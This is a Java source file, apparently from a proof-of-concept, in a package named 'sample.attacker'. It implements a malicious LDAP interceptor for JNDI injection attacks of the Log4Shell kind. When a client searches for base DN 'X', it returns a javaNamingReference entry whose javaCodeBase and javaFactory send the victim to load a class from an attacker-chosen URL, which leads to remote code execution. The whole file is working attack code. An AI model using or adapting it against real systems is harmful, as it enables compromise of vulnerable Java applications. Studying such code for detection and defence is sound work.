package sample.attacker;

import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPException;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;

class ReferenceInterceptor extends InMemoryOperationInterceptor {
    
    private final Logger logger = LoggerFactory.getLogger(getClass());
    private final String baseUrl;
    private final String className;

    public ReferenceInterceptor(String baseUrl, String className) {
        this.baseUrl = baseUrl;
        this.className = className;
    }

    @Override
    public void processSearchResult(InMemoryInterceptedSearchResult result) {
        String baseDn = result.getRequest().getBaseDN();
        if(baseDn.equals("X")) {
            sendResult(result, baseDn);
        }
    }

    private void sendResult(InMemoryInterceptedSearchResult result, String baseDn) {
        try {
            String classUrl = baseUrl + className.replace(".", "/") + ".class";
            logger.info("Send LDAP reference result for " + baseDn + " redirecting to " + classUrl);
            Entry entry = new Entry(baseDn);
            entry.addAttribute("objectClass", "javaNamingReference");
            entry.addAttribute("javaClassName", "Unused");
            entry.addAttribute("javaCodeBase", baseUrl);
            entry.addAttribute("javaFactory", className);
            result.sendSearchEntry(entry);
            result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
        } catch (LDAPException e) {
            logger.error("Failed to send LDAP result", e);
        }
    }
}
